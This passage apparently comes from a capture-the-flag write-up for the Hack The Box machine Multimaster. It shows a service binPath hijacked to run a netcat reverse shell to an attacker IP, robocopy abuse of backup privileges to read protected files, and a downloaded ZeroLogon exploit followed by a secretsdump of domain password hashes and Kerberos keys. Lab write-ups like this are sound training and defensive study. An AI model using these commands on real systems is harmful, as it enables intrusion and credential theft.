     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                                                           
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                                                          
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                                                            
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                                                                                               
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                                                                                             
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                                                                                            
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                                                                                              
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\accesschk.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\accesschk64.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Documents and Settings\All Users\Application Data\winPEASany.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\jorden\My Documents\nc.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\jorden\Documents\nc.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\winPEASany.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\accesschk64a.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\accesschk64.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\accesschk.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                                                                                              
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                                                                                            
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                                                                                             
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                                                                                               
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                                                            
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                                                          
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                                                           
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                                                             
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                          
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                        
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                         
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                           
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                        
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                      
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                       
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                         
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]        
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]      
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]     
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]       
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                          
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                        
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                       
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                         
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                                            
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                                          
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                                         
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                                           
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                                                                              
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                                                                            
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                                                                           
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                                                                             
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]                                                                                                                                                
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]                                                                                                                                              
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]                                                                                                                                             
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]                                                                                                                                               
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\accesschk.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\accesschk64.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\Application Data\Application Data\winPEASany.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\accesschk.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\accesschk64.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\accesschk64a.exe": jorden [Allow: AllAccess]
     File Permissions "C:\Users\All Users\Application Data\winPEASany.exe": jorden [Allow: AllAccess]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Linux shells/distributions - wsl.exe, bash.exe (T1059.004)

       /---------------------------------------------------------------------------------\                                                                  
       |                             Do you like PEASS?                                  |                                                                  
       |---------------------------------------------------------------------------------|                                                                  
       |         Linux PE & Hardening    :     https://hacktricks-training.com/courses/lhe/ |                                                               
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                  
       |         Follow on Twitter         :     @hacktricks_live                        |                                                                  
       |         Respect on HTB            :     SirBroccoli                             |                                                                  
       |---------------------------------------------------------------------------------|                                                                  
       |                                 Thank you!                                      |                                                                  
       \---------------------------------------------------------------------------------/                                                                  
                                                                                               
```

```
┌──(root㉿kali)-[~/Desktop/targetedKerberoast]
└─# locate nc.exe       
/opt/payloads/SecLists/Web-Shells/FuzzDB/nc.exe
/root/Desktop/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe

```

```
*Evil-WinRM* PS C:\> cd ProgramData
*Evil-WinRM* PS C:\ProgramData> upload /root/Desktop/nc.exe
                                        
Info: Uploading /root/Desktop/nc.exe to C:\ProgramData\nc.exe
                                        

```

```
*Evil-WinRM* PS C:\ProgramData> sc.exe config browser binPath="C:\ProgramData\nc.exe -e cmd.exe 10.10.14.45  443"
[SC] ChangeServiceConfig SUCCESS

```

```
*Evil-WinRM* PS C:\ProgramData> sc.exe stop browser

SERVICE_NAME: browser
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0xafc8

```

```
*Evil-WinRM* PS C:\ProgramData> sc.exe start browser

SERVICE_NAME: browser
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2136
        FLAGS              :

```

The service runs as **SYSTEM**, so your netcat listener receives a SYSTEM shell. You need to act fast because the revert task resets it every 2 minutes.

```
┌──(root㉿kali)-[~/Desktop/targetedKerberoast]
└─# rlwrap nc -lnvp 443
listening on [any] 443 ...



connect to [10.10.14.45] from (UNKNOWN) [10.129.95.200] 55228
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\Windows\system32>
C:\Windows\system32>
C:\Windows\system32>whoami 
whoami 
nt authority\system

C:\Windows\system32>

```

### `SeBackupPrivilege` and `SeRestorePrivilege`

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-SeRestorePrivilege-SeBackupPrivilege" >}} SeBackupPrivilege and SeRestorePrivilege ,With both of these privs, I can use  robocopy to read files

{{< /toggle >}}

With both of these privs, I can use `robocopy` to read files (see [PayloadsAllTheThings short reference](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges)).

```
*Evil-WinRM* PS C:\ProgramData> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

```

```
*Evil-WinRM* PS C:\ProgramData> robocopy /b C:\users\administrator\desktop C:\programdata\temp

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, May 15, 2026 12:50:52 AM
   Source : C:\users\administrator\desktop\
     Dest : C:\programdata\temp\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          2    C:\users\administrator\desktop\
            New File                 488        desktop.ini
  0%
100%
            New File                  34        root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         2         2         0         0         0         0
   Bytes :       522       522         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Friday, May 15, 2026 12:50:52 AM

```

```
*Evil-WinRM* PS C:\ProgramData> cd C:\programdata\temp
*Evil-WinRM* PS C:\programdata\temp> ls


    Directory: C:\programdata\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/14/2026   2:35 AM             34 root.txt


*Evil-WinRM* PS C:\programdata\temp> type root.txt
5f6221980c0b1cf5fa22232304ea2c0b
*Evil-WinRM* PS C:\programdata\temp> 

```

We can do for the sam and system

like that

```
*Evil-WinRM* PS C:\programdata\temp> robocopy /b C:\Windows\System32 C:\programdata\temp SAM SYSTEM SECURITY

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, May 15, 2026 12:55:17 AM
   Source : C:\Windows\System32\
     Dest : C:\programdata\temp\

    Files : SAM
            SYSTEM
            SECURITY

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           0    C:\Windows\System32\

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         0         0         0         0         0         0
   Bytes :         0         0         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Friday, May 15, 2026 12:55:17 AM


```

they should dont have the SAM SYSTEM SECURITY

```
C:\Windows\System32>dir SAM
 Volume in drive C has no label.
 Volume Serial Number is 7B4A-4B5F

 Directory of C:\Windows\System32

File Not Found

```

### ZeroLogon

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-ZeroLogon" >}} If the target is Active Directory that we can use this CVE-2020-1472 ,without password username , only with the domain ,so that can be enable to get the shell

{{< /toggle >}}

Once the attacker knows the machine account password for a domain controller, they are able to dump all the hashes from the computer, where it is then trivial to use the administrator hash to get a session. This means that any attacker with network access to an unpatched domain controller can become domain admin.

### Limit ?

1. Active Directory

To get around this, I installed a copy of Impacket into a Python virtual environment. I cloned a copy with `git clone https://github.com/SecureAuthCorp/impacket.git`. Then, `cd impacket`, and I’ll create a virtual env with `python3 -m venv venv`. Now activate it, and see that the prompt changes:

```
┌──(root㉿kali)-[~/Desktop]
└─# git clone https://github.com/SecureAuthCorp/impacket.git
Cloning into 'impacket'...
remote: Enumerating objects: 25650, done.
remote: Counting objects: 100% (234/234), done.
remote: Compressing objects: 100% (183/183), done.
remote: Total 25650 (delta 166), reused 51 (delta 51), pack-reused 25416 (from 3)
Receiving objects: 100% (25650/25650), 11.00 MiB | 5.55 MiB/s, done.
Resolving deltas: 100% (19582/19582), done.
                                                                            
                                                                             
┌──(root㉿kali)-[~/Desktop]
└─# cd impacket 
                                                                                               
┌──(root㉿kali)-[~/Desktop/impacket]
└─# python3 -m venv venv
                                                                             
┌──(root㉿kali)-[~/Desktop/impacket]
└─# source venv/bin/activate                                


```

```
┌──(venv)─(root㉿kali)-[~/Desktop/impacket]
└─# wget https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/refs/heads/master/cve-2020-1472-exploit.py 
--2026-05-15 03:39:13--  https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/refs/heads/master/cve-2020-1472-exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4859 (4.7K) [text/plain]
Saving to: ‘cve-2020-1472-exploit.py.2’

cve-2020-1472-explo 100%[================>]   4.75K  --.-KB/s    in 0.002s  

2026-05-15 03:39:13 (2.02 MB/s) - ‘cve-2020-1472-exploit.py.2’ saved [4859/4859]

```

Now `pip install .` will install Impacket. As long as I’m running with the virtual env activated, it will all work nicely together. To deactivate the virtual environment, I’ll just run `deactivate`.

```
──(venv)─(root㉿kali)-[~/Desktop/impacket]
└─# pip install .  
Processing /root/Desktop/impacket
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Collecting pyasn1>=0.2.3 (from impacket==0.13.1)
  Downloading pyasn1-0.6.3-py3-none-any.whl.metadata (8.4 kB)
Collecting pyasn1_modules (from impacket==0.13.1)
  Downloading pyasn1_modules-0.4.2-py3-none-any.whl.metadata (3.5 kB)
Collecting pycryptodomex (from impacket==0.13.1)
  Downloading pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Collecting pyOpenSSL (from impacket==0.13.1)
  Downloading pyopenssl-26.2.0-py3-none-any.whl.metadata (19 kB)
Requirement already satisfied: six in ./venv/lib/python3.13/site-packages (from impacket==0.13.1) (1.17.0)
Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 (from impacket==0.13.1)
  Downloading ldap3-2.9.1-py2.py3-none-any.whl.metadata (5.4 kB)
Collecting ldapdomaindump>=0.9.0 (from impacket==0.13.1)
  Downloading ldapdomaindump-0.10.0-py3-none-any.whl.metadata (512 bytes)
Collecting flask>=1.0 (from impacket==0.13.1)
  Downloading flask-3.1.3-py3-none-any.whl.metadata (3.2 kB)
Collecting charset_normalizer (from impacket==0.13.1)
  Using cached charset_normalizer-3.4.7-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (40 kB)
Collecting blinker>=1.9.0 (from flask>=1.0->impacket==0.13.1)
  Downloading blinker-1.9.0-py3-none-any.whl.metadata (1.6 kB)
Collecting click>=8.1.3 (from flask>=1.0->impacket==0.13.1)
  Downloading click-8.3.3-py3-none-any.whl.metadata (2.6 kB)
Collecting itsdangerous>=2.2.0 (from flask>=1.0->impacket==0.13.1)
  Downloading itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
Collecting jinja2>=3.1.2 (from flask>=1.0->impacket==0.13.1)
  Downloading jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
Collecting markupsafe>=2.1.1 (from flask>=1.0->impacket==0.13.1)
  Downloading markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (2.7 kB)
Collecting werkzeug>=3.1.0 (from flask>=1.0->impacket==0.13.1)
  Downloading werkzeug-3.1.8-py3-none-any.whl.metadata (4.0 kB)
Collecting dnspython (from ldapdomaindump>=0.9.0->impacket==0.13.1)
  Downloading dnspython-2.8.0-py3-none-any.whl.metadata (5.7 kB)
Collecting cryptography<49,>=46.0.0 (from pyOpenSSL->impacket==0.13.1)
  Downloading cryptography-48.0.0-cp311-abi3-manylinux_2_34_x86_64.whl.metadata (4.3 kB)
Collecting cffi>=2.0.0 (from cryptography<49,>=46.0.0->pyOpenSSL->impacket==0.13.1)
  Downloading cffi-2.0.0-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (2.6 kB)
Collecting pycparser (from cffi>=2.0.0->cryptography<49,>=46.0.0->pyOpenSSL->impacket==0.13.1)
  Downloading pycparser-3.0-py3-none-any.whl.metadata (8.2 kB)
Downloading flask-3.1.3-py3-none-any.whl (103 kB)
Downloading blinker-1.9.0-py3-none-any.whl (8.5 kB)
Downloading click-8.3.3-py3-none-any.whl (110 kB)
Downloading itsdangerous-2.2.0-py3-none-any.whl (16 kB)
Downloading jinja2-3.1.6-py3-none-any.whl (134 kB)
Downloading ldap3-2.9.1-py2.py3-none-any.whl (432 kB)
Downloading ldapdomaindump-0.10.0-py3-none-any.whl (19 kB)
Downloading markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (22 kB)
Downloading pyasn1-0.6.3-py3-none-any.whl (83 kB)
Downloading werkzeug-3.1.8-py3-none-any.whl (226 kB)
Using cached charset_normalizer-3.4.7-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (215 kB)
Downloading dnspython-2.8.0-py3-none-any.whl (331 kB)
Downloading pyasn1_modules-0.4.2-py3-none-any.whl (181 kB)
Downloading pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 7.3 MB/s  0:00:00
Downloading pyopenssl-26.2.0-py3-none-any.whl (55 kB)
Downloading cryptography-48.0.0-cp311-abi3-manylinux_2_34_x86_64.whl (4.7 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.7/4.7 MB 7.6 MB/s  0:00:00
Downloading cffi-2.0.0-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (219 kB)
Downloading pycparser-3.0-py3-none-any.whl (48 kB)
Building wheels for collected packages: impacket
  Building wheel for impacket (pyproject.toml) ... done
  Created wheel for impacket: filename=impacket-0.13.1-py3-none-any.whl size=1751974 sha256=02a3ec362b48b7edfa6e787bb04d809efc26671e66096155a03f31a4f9b3591c
  Stored in directory: /tmp/pip-ephem-wheel-cache-f4iqul6i/wheels/5f/b8/8b/e170b1d193af3b04f17206eca447b27ead9feda059f8bcb9f9
Successfully built impacket
Installing collected packages: pycryptodomex, pycparser, pyasn1, markupsafe, itsdangerous, dnspython, click, charset_normalizer, blinker, werkzeug, pyasn1_modules, ldap3, jinja2, cffi, ldapdomaindump, flask, cryptography, pyOpenSSL, impacket
Successfully installed blinker-1.9.0 cffi-2.0.0 charset_normalizer-3.4.7 click-8.3.3 cryptography-48.0.0 dnspython-2.8.0 flask-3.1.3 impacket-0.13.1 itsdangerous-2.2.0 jinja2-3.1.6 ldap3-2.9.1 ldapdomaindump-0.10.0 markupsafe-3.0.3 pyOpenSSL-26.2.0 pyasn1-0.6.3 pyasn1_modules-0.4.2 pycparser-3.0 pycryptodomex-3.23.0 werkzeug-3.1.8

```

MULTIMASTER is the domain name

```
┌──(venv)─(root㉿kali)-[~/Desktop/impacket]
└─# secretsdump.py -just-dc -no-pass MULTIMASTER\$@10.129.95.200
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06e3ae564999dbad74e576cdf0f717d3:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MEGACORP.LOCAL\svc-nas:1103:aad3b435b51404eeaad3b435b51404ee:fe90dcf97ce6511a65151881708d6027:::
MEGACORP.LOCAL\tushikikatomo:1110:aad3b435b51404eeaad3b435b51404ee:1c9c8bfd28d000e8904f23c280b25d21:::
MEGACORP.LOCAL\andrew:1111:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
MEGACORP.LOCAL\lana:1112:aad3b435b51404eeaad3b435b51404ee:3c3c292710286a539bbec397d15b4680:::
MEGACORP.LOCAL\alice:1601:aad3b435b51404eeaad3b435b51404ee:19b44ab9ec562fe20b35ddb7c6fc0689:::
MEGACORP.LOCAL\dai:2101:aad3b435b51404eeaad3b435b51404ee:cb8a655c8bc531dd01a5359b40b20e7b:::
MEGACORP.LOCAL\svc-sql:2102:aad3b435b51404eeaad3b435b51404ee:3a36abdc15d86766d4cd243d8557e10d:::
MEGACORP.LOCAL\sbauer:3102:aad3b435b51404eeaad3b435b51404ee:050ba67142895b5844a24d5ce9644702:::
MEGACORP.LOCAL\okent:3103:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\ckane:3104:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\kpage:3105:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\james:3106:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\cyork:3107:aad3b435b51404eeaad3b435b51404ee:06327297532725a64e1edec0aad81cfe:::
MEGACORP.LOCAL\rmartin:3108:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\zac:3109:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\jorden:3110:aad3b435b51404eeaad3b435b51404ee:90960176fcbfe36b4a69fafb3cc0b716:::
MEGACORP.LOCAL\alyx:3111:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\ilee:3112:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\nbourne:3113:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\zpowers:3114:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\aldom:3115:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\jsmmons:3116:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MEGACORP.LOCAL\pmartin:3117:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
MULTIMASTER$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:98c8f1aaae0f1a5487165b37927deb6eeadc470e0b81d7dedef4239d57288747
Administrator:aes128-cts-hmac-sha1-96:593ee7a6ac6375581b9ecdd339d817d5
Administrator:des-cbc-md5:1afee316ec6e860e
krbtgt:aes256-cts-hmac-sha1-96:a6deb907245296f7739153833b79d47ef7a9671b29606d6967e69e8077c43780
